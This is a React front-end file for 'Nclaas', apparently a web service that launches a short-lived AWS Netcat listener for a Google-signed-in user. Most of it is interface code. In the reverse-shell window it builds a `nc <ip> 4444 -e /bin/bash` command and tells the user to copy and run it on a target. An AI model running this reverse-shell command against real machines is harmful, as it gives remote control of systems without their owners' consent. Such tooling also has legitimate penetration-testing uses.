import React, { useState, useEffect } from "react";
import { auth, provider } from "./firebase";
import { signInWithPopup, signOut } from "firebase/auth";
import "./index.css";
import TerminalComponent from "./Terminal";

const gridBg = `bg-black bg-[radial-gradient(circle,rgba(255,255,255,0.04)_1px,transparent_1px)] bg-[size:20px_20px]`;
const INSTANCE_DURATION = 15 * 60; // 15 minutes in seconds
const MAX_LAUNCHES_PER_DAY = 2;

function App() {
  const [user, setUser] = useState(null);
  const [instance, setInstance] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(INSTANCE_DURATION);
  const [launchCount, setLaunchCount] = useState(0);
  const [showLimitPopup, setShowLimitPopup] = useState(false);

  const todayStr = () => new Date().toISOString().slice(0, 10);

  useEffect(() => {
    if (user) {
      const data = JSON.parse(localStorage.getItem("launches") || "{}");
      setLaunchCount(data[user.uid]?.[todayStr()] || 0);
    }
  }, [user]);

  useEffect(() => {
    if (instance && timer > 0) {
      const interval = setInterval(() => setTimer(t => t - 1), 1000);
      return () => clearInterval(interval);
    }
    if (timer === 0 && instance) {
      setShowLimitPopup(true);
    }
  }, [instance, timer]);

  const formatTime = s => `${String(Math.floor(s/60)).padStart(2, "0")}:${String(s%60).padStart(2, "0")}`;

  const incrementLaunchCount = () => {
    const data = JSON.parse(localStorage.getItem("launches") || "{}");
    if (!data[user.uid]) data[user.uid] = {};
    data[user.uid][todayStr()] = (data[user.uid][todayStr()] || 0) + 1;
    localStorage.setItem("launches", JSON.stringify(data));
    setLaunchCount(data[user.uid][todayStr()]);
  };

  const handleLogin = async () => {
    try {
      const result = await signInWithPopup(auth, provider);
      setUser(result.user);
    } catch (err) {
      setError("Google login failed");
    }
  };

  const handleLogout = async () => {
    await signOut(auth);
    setUser(null);
    setInstance(null);
    setTimer(INSTANCE_DURATION);
    setLaunchCount(0);
  };

  const getUserIP = async () => {
    // Use a public IP API
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  };

  const bootInstance = async () => {
    if (launchCount >= MAX_LAUNCHES_PER_DAY) {
      setShowLimitPopup(true);
      return;
    }
    setLoading(true);
    setError("");
    try {
      const user_ip = await getUserIP();
      const res = await fetch("/launch-instance", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user_ip, user_email: user.email }),
      });
      let data;
      try {
        data = await res.json();
      } catch (e) {
        setError("Unexpected server response. Please check backend logs.");
        setLoading(false);
        return;
      }
      if (!res.ok) {
        setError(data.error || "Failed to launch instance");
        setLoading(false);
        return;
      }
      setInstance(data);
      setTimer(INSTANCE_DURATION);
      incrementLaunchCount();
    } catch (err) {
      setError(err.message);
    }
    setLoading(false);
  };

  const getReverseShellScript = (ip, port = 4444) =>
    `nc ${ip} ${port} -e /bin/bash`;

  return (
    <div className={`min-h-screen ${gridBg} flex flex-col items-center justify-center`}>
      <div className="absolute top-0 left-0 w-full h-full bg-green-400 -z-10" style={{ filter: 'blur(2px)', opacity: 0.2 }} />
      <div className="w-full max-w-5xl mx-auto p-6 rounded-xl shadow-2xl bg-black bg-opacity-90 border border-gray-700 relative">
        <header className="flex justify-between items-center mb-6">
          <h1 className="text-2xl font-bold text-white tracking-widest">Nclaas <span className="text-xs text-red-500 align-top">● Live</span></h1>
          <nav className="flex gap-6 text-gray-300">
            <span>Social</span>
            <span>Alerts</span>
            <span>Profile</span>
            {user ? (
              <button onClick={handleLogout} className="ml-4 px-3 py-1 bg-gray-800 rounded text-sm text-gray-200 hover:bg-gray-700">Logout</button>
            ) : null}
          </nav>
        </header>
        {!user ? (
          <div className="flex flex-col items-center justify-center py-24">
            <button onClick={handleLogin} className="bg-white text-black px-6 py-3 rounded-lg font-semibold shadow hover:bg-gray-200 flex items-center gap-2">
              <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google" className="w-6 h-6" />
              Sign in with Google
            </button>
            {error && <p className="text-red-500 mt-4">{error}</p>}
          </div>
        ) : (
          <div className="grid grid-cols-5 gap-6">
            {/* Sidebar */}
            <aside className="col-span-1 flex flex-col gap-6 text-gray-200 mt-2">
              <SidebarIcon label="Evidence" icon="📁" />
              <SidebarIcon label="Audio_5301" icon="🎵" />
              <SidebarIcon label="top_secret.mp4" icon="🎵" />
              <SidebarIcon label="Chat" icon="💬" />
              <SidebarIcon label="Journal" icon="📓" />
              <SidebarIcon label="Discord" icon="🎮" />
              <SidebarIcon label="Whiteboard" icon="🖥️" />
            </aside>
            {/* Main content */}
            <main className="col-span-4">
              <div className="flex flex-col gap-6">
                <div className="bg-gray-900 rounded-lg p-6 shadow-lg border border-gray-700 mb-4">
                  <h2 className="text-xl font-semibold text-white mb-2">Cloud Netcat Listener</h2>
                  <p className="text-gray-400 mb-4">Launch a temporary, cloud-hosted Netcat listener instance on AWS with one click. Instance will auto-shutdown after 15 minutes.</p>
                  <button
                    onClick={bootInstance}
                    disabled={loading || instance}
                    className="bg-green-500 hover:bg-green-600 text-black font-bold px-6 py-2 rounded-lg disabled:opacity-50"
                  >
                    {loading ? "Booting..." : instance ? "Instance Running" : "Boot Netcat Instance"}
                  </button>
                  {error && <p className="text-red-500 mt-4">{error}</p>}
                  {instance && (
                    <div className="mt-6 bg-gray-800 rounded p-4 text-green-200">
                      <div><b>Public IP:</b> {instance.public_ip}</div>
                      <div><b>SSH Command:</b> <code className="bg-gray-900 px-2 py-1 rounded">{instance.ssh_command}</code></div>
                      <div><b>Netcat Command:</b> <code className="bg-gray-900 px-2 py-1 rounded">{instance.netcat_command}</code></div>
                      <div><b>Status:</b> {instance.status}</div>
                      <div className="mt-4 text-lg text-yellow-300">Time left: {formatTime(timer)}</div>
                    </div>
                  )}
                </div>
                {/* Simulated floating windows */}
                {instance && (
                  <div className="mb-4 flex gap-4">
                    <button
                      onClick={async () => {
                        if (!instance) return;
                        await fetch("/terminate-instance", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ instance_id: instance.instance_id }),
                        });
                        setInstance(null);
                        setTimer(INSTANCE_DURATION);
                      }}
                      className="bg-red-600 hover:bg-red-700 text-white font-bold px-4 py-2 rounded-lg"
                    >
                      Terminate Instance
                    </button>
                  </div>
                )}
                {instance && (
                  <div className="flex gap-4">
                    <FloatingWindow title="REVERSE SHELL (pentestmonkey)" className="w-1/2">
                      <div className="text-gray-300 text-xs h-32 overflow-y-auto flex flex-col gap-2">
                        <span>Copy and run this on your target to get a shell in your browser:</span>
                        <pre className="bg-gray-900 p-2 rounded text-green-400 select-all cursor-pointer" onClick={e => {navigator.clipboard.writeText(getReverseShellScript(instance.public_ip));}}>{getReverseShellScript(instance.public_ip)}</pre>
                        <span className="text-gray-500">(Click to copy)</span>
                      </div>
                    </FloatingWindow>
                    <FloatingWindow title="INSTANCE INFO" className="w-1/2">
                      <div className="text-gray-300 text-xs h-32 overflow-y-auto">
                        <div><b>OS:</b> Debian/Kali/Other</div>
                        <div><b>Public IP:</b> {instance.public_ip}</div>
                        <div><b>Status:</b> {instance.status}</div>
                        <div><b>Instance ID:</b> {instance.instance_id}</div>
                        <div><b>SSH Command:</b> <code className="bg-gray-900 px-2 py-1 rounded">{instance.ssh_command}</code></div>
                      </div>
                    </FloatingWindow>
                  </div>
                )}
                {/* Footer */}
                <footer className="flex justify-between items-center mt-8 text-gray-400 text-xs">
                  <div className="bg-black px-4 py-2 rounded-lg border border-gray-700">
                    {new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })} <span className="ml-2">{new Date().toLocaleDateString(undefined, { weekday: 'long', year: 'numeric', month: 'short', day: 'numeric' })}</span>
                  </div>
                </footer>
                {instance && (
                  <div className="mt-8">
                    <TerminalComponent />
                  </div>
                )}
              </div>
            </main>
          </div>
        )}
        {showLimitPopup && (
          <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-50">
            <div className="bg-white p-6 rounded-lg shadow-lg text-center">
              <h2 className="text-xl font-bold mb-2">Time limit is over {launchCount}/{MAX_LAUNCHES_PER_DAY}</h2>
              {launchCount < MAX_LAUNCHES_PER_DAY
                ? <p>You can launch one more instance today.</p>
                : <p>You have reached your daily limit. Please try again tomorrow.</p>
              }
              <button
                className="mt-4 px-4 py-2 bg-blue-600 text-white rounded"
                onClick={() => {
                  setShowLimitPopup(false);
                  setInstance(null);
                  setTimer(INSTANCE_DURATION);
                }}
              >
                OK
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function SidebarIcon({ label, icon }) {
  return (
    <div className="flex items-center gap-3 px-2 py-2 hover:bg-gray-800 rounded cursor-pointer">
      <span className="text-2xl">{icon}</span>
      <span className="text-sm font-medium">{label}</span>
    </div>
  );
}

function FloatingWindow({ title, children, className }) {
  return (
    <div className={`bg-gray-900 border border-gray-700 rounded-lg shadow-lg p-2 ${className || ''}`}> 
      <div className="flex justify-between items-center border-b border-gray-700 pb-1 mb-2">
        <span className="text-xs text-gray-300 font-bold">{title}</span>
        <span className="text-gray-500 text-xs">■ □ ✕</span>
      </div>
      <div>{children}</div>
    </div>
  );
}

export default App; 